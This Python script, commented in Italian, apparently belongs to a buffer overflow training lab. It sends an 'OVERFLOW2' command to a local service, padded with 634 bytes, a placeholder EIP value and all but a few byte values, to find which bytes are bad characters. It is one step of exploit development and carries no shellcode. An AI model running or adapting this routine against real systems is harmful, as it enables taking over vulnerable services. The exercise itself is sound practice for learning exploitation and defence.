import socket 

ip = "192.168.64.4" 
port = 1337 
timeout = 5 

# Lista dei caratteri da ignorare (iniziamo con il null byte) 
ignore_chars = [b"\x00", b"\x23", b"\x3c", b"\x83", b"\xba"]
badchars_bytes = b"" 
for i in range(256):        
    char_byte = bytes([i]) # Converti l'intero in un oggetto byte        
    if char_byte not in ignore_chars:            
        badchars_bytes += char_byte

offset_eip = 634
eip_placeholder = b"BBBB" # Placeholder per EIP 

# Inviamo il padding, un EIP placeholder, 
# # e poi tutti i possibili byte (esclusi quelli ignorati) 
payload = b"A" * offset_eip + eip_placeholder + badchars_bytes 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.settimeout(timeout) 
con = s.connect((ip, port)) 
s.recv(1024) 
s.send(b"OVERFLOW2 " + payload) 
s.recv(1024) 
s.close()